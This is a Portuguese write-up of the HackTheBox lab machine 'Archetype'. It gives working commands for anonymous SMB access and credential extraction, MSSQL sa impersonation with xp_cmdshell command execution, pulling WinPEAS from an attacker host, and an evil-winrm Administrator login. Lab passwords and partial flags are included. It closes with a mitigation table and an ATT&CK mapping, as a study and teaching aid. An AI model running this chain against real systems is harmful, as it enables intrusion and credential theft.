# Archetype — HackTheBox

**Plataforma:** HackTheBox
**Máquina:** Archetype
**Dificuldade:** Easy
**SO:** Windows
**Data:** 02/08/2026
**Tags:** #enum #foothold #privesc #mssql #smb #ad
**Status:** Retired ✅ (publicação em conformidade com os ToS do HTB)

## TL;DR

O acesso inicial explora um **compartilhamento SMB (`backups`) com leitura anônima habilitada**, de onde foi extraído um arquivo de configuração SSIS (`prod.dtsConfig`) contendo **credenciais em texto plano** para a conta de serviço `sql_svc`. Essa conta possui privilégio **`sysadmin`** no MSSQL — um excesso de privilégio para uma conta usada apenas para conectividade de aplicação — o que permitiu impersonar o login `sa` e habilitar `xp_cmdshell`, obtendo execução de comandos no sistema operacional.

A partir da execução via `xp_cmdshell`, o WinPEAS foi transferido e executado para enumerar o host. O achado decisivo veio do histórico persistido do PSReadLine (`ConsoleHost_history.txt`), que continha um comando `net use` com a **senha do Administrador em texto plano**. Com essa credencial, acesso via WinRM (`evil-winrm`) rendeu shell como Administrator.

**Cadeia de ataque:** SMB anônimo (`backups`) → Credenciais MSSQL vazadas em `prod.dtsConfig` → Login `sql_svc` com `sysadmin` → Impersonação de `sa` → `xp_cmdshell` habilitado (RCE) → user.txt → WinPEAS revela senha do Administrador no histórico do PSReadLine → WinRM como Administrator → root.txt

---

## 1. Reconhecimento

### 1.1 Varredura de portas e enumeração SMB

```bash
nmap -oN arch.txt --script smb-enum-shares,smb-enum-users 10.129.239.185
```

| Porta | Serviço |
|---|---|
| 135 | msrpc |
| 139 | netbios-ssn |
| 445 | microsoft-ds |
| 1433 | ms-sql-s |
| 5985 | wsman (WinRM) |

O script `smb-enum-shares` revelou as ACLs dos compartilhamentos sem necessidade de credenciais:

| Share | Acesso anônimo | Acesso do usuário atual |
|---|---|---|
| ADMIN$ | nenhum | nenhum |
| C$ | nenhum | nenhum |
| IPC$ | LEITURA/ESCRITA | LEITURA/ESCRITA |
| backups | **LEITURA** | LEITURA |

Apenas o share `backups` chamou atenção — acesso anônimo de leitura a um compartilhamento não-padrão é um indício direto de vetor de ataque.

`enum4linux -U` confirmou que uma sessão nula era aceita, mas não retornou enumeração útil de usuários/domínio (`NT_STATUS_ACCESS_DENIED` nas chamadas RPC) — esperado, já que Archetype é um host standalone, não ingressado em domínio.

### 1.2 Extração de credenciais via SMB anônimo

```bash
smbclient //10.129.239.185/backups -N
```

Um único arquivo foi encontrado e baixado, `prod.dtsConfig` (arquivo de deployment de pacote SSIS):

```xml
<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;
Auto Translate=False;</ConfiguredValue>
```

Isso expôs uma credencial em texto plano para uma conta local do Windows usada para rodar o SQL Server:

- **Usuário:** `ARCHETYPE\sql_svc`
- **Senha:** `M3g4c0rp123`

---

## 2. Foothold (acesso inicial)

### 2.1 Autenticação no MSSQL e impersonação de `sa`

A porta 1433 (MSSQL) aceitou a credencial vazada diretamente:

```bash
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.239.185 -windows-auth
```

`sql_svc` era, a princípio, um login de baixo privilégio, mas o `enum_impersonate` do mssqlclient expôs um caminho de impersonação:

```sql
enum_impersonate
-- mostrou: permissão EXECUTE-AS USER em msdb via dc_admin -> MS_DataCollectorInternalUser

exec_as_login sa
enable_xp_cmdshell
```

O login Windows `sql_svc` estava, na verdade, marcado como **`sysadmin`** em `enum_logins`, o que explica por que a impersonação para `sa` funcionou de forma tão direta, e permitiu habilitar o `xp_cmdshell` (desabilitado por padrão) para obter execução de comandos no nível do sistema operacional, como a conta de serviço do SQL Server:

```sql
xp_cmdshell whoami
xp_cmdshell dir c:\users\sql_svc\desktop
```

### 2.2 User flag

```
xp_cmdshell powershell -c "Get-Content c:\users\sql_svc\desktop\user.txt"
```

**User flag capturada:** `3e7b102e...21a3`

---

## 3. Escalada de privilégios

### 3.1 Enumeração pós-exploração com WinPEAS

Para encontrar um caminho de execução no contexto de `sql_svc` até Administrator completo, o WinPEAS foi transferido e executado através do RCE do SQL:

1. Hospedei o `winPEASx64.exe` na máquina de ataque (`python3 -m http.server`) e o baixei via `Invoke-WebRequest` através do `xp_cmdshell`.
2. Executei o WinPEAS redirecionando a saída para um arquivo, evitando que a formatação de result-set do `xp_cmdshell` corrompesse o relatório:

   ```
   xp_cmdshell powershell -c "C:\Users\sql_svc\winPEAS.exe > C:\Users\sql_svc\winpeas_out.txt"
   ```

3. Consultei o arquivo diretamente via PowerShell (`Get-Content`, `Select-String`) em vez de tentar `type`/`cat` via `cmd.exe`, já que filtrar uma saída grande em texto plano é mais viável assim através de um canal de RCE limitado.

Achados relevantes no relatório do WinPEAS:

- **Hash NetNTLMv2** de `sql_svc` capturado via `Enumerating Security Packages Credentials` — uma via alternativa de cracking offline/relay caso o histórico de credenciais não tivesse funcionado.
- **Chaves mestras DPAPI** presentes no perfil de `sql_svc` — outro caminho potencial para material de credencial.
- Diversas chaves de registro `HKLM` graváveis por grupos de baixo privilégio (`BUILTIN\Users`) — relevante em um engajamento real, embora não necessário para esta cadeia.

O achado que de fato importou veio de **Windows Credentials → Recently run commands**, apontando para o histórico de entrada persistido do PowerShell:

```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

**Credencial do Administrator recuperada em texto plano:** `MEGACORP_4dm1n!!`

### 3.2 Administrator via WinRM

A porta 5985 (WinRM) estava aberta, então a credencial recuperada pôde ser usada diretamente, sem exploração adicional:

```bash
evil-winrm -i 10.129.239.185 -u administrator -p 'MEGACORP_4dm1n!!'
```

> **Nota sobre quoting no bash:** a senha contém `!!`, o que dispara expansão de histórico do bash se deixada sem aspas ou entre aspas duplas. É necessário usar aspas simples para que seja passada literalmente.

### 3.3 Root flag

```powershell
Get-Content C:\Users\Administrator\Desktop\root.txt
```

**Root flag capturada:** `b91ccec3...8528`

---

## 4. Causa raiz e mitigação

| # | Vulnerabilidade | Causa raiz | Mitigação |
|---|---|---|---|
| 1 | Leitura anônima no share SMB `backups` | Compartilhamento não-padrão criado sem as mesmas ACLs restritivas de `ADMIN$`/`C$` | Remover acesso anônimo/guest; restringir ACLs de shares apenas às contas de serviço necessárias |
| 2 | Credenciais em texto plano em `prod.dtsConfig` | Arquivo de configuração de deployment SSIS armazena connection string com senha embutida | Usar autenticação integrada do Windows para conexões SQL, ou armazenar segredos em um cofre gerenciado, nunca em arquivos de configuração de deploy |
| 3 | Conta de serviço `sql_svc` com `sysadmin` | Privilégio excessivo concedido a uma conta usada apenas para conectividade de aplicação | Princípio do menor privilégio — restringir logins SQL apenas aos bancos/permissões que a aplicação realmente necessita |
| 4 | `xp_cmdshell` habilitável | Procedimento estendido permite execução de comandos do SO a partir de um login SQL comprometido | Manter desabilitado em produção; se necessário, usar uma conta de proxy restrita em vez de rodar como `sa` |
| 5 | Senha do Administrador em `ConsoleHost_history.txt` | PSReadLine persiste em disco cada linha digitada em sessão interativa do PowerShell, sem redação automática | Nunca digitar segredos inline em um shell interativo; limpar/rotacionar o histórico do PSReadLine; usar cofres de credenciais ou prompts `Get-Credential` |

---

## 5. Lições aprendidas

- Um único compartilhamento SMB legível, mesmo que não-padrão, vale a pena ser enumerado por completo antes de seguir em frente — `IPC$`/`ADMIN$` bloqueados não significam que a máquina está segura se um share customizado foi adicionado sem as mesmas ACLs.
- Arquivos de configuração SSIS/DTS são um vetor conhecido de vazamento de credenciais, pois connection strings costumam ser deixadas em texto plano para viabilizar automação de deploy.
- Conceder `sysadmin` a uma conta de serviço usada apenas para conectividade de aplicação é um excesso de privilégio crítico — praticamente qualquer comprometimento do login vira RCE via `xp_cmdshell`.
- O histórico do PSReadLine é um dos locais mais valiosos e recorrentes a se checar em qualquer escalada de privilégio em Windows: qualquer comando digitado com senha inline (`net use`, `runas`, scripts ad-hoc) vira um vazamento de credencial permanente em um arquivo legível pelo usuário comum.

---

## Ferramentas utilizadas

`nmap`, `smbclient`, `enum4linux`, `impacket-mssqlclient`, `impacket-smbserver`, `winPEASx64.exe`, `evil-winrm`

## Mapeamento MITRE ATT&CK

- **T1552.001** — Unsecured Credentials: Credentials in Files (`prod.dtsConfig`, `ConsoleHost_history.txt`)
- **T1078** — Valid Accounts (`sql_svc`, `administrator`)
- **T1059.003 / T1059.001** — Execução de comandos via `cmd.exe` / PowerShell (`xp_cmdshell`)
- **T1021.006** — Remote Services: Windows Remote Management (WinRM)
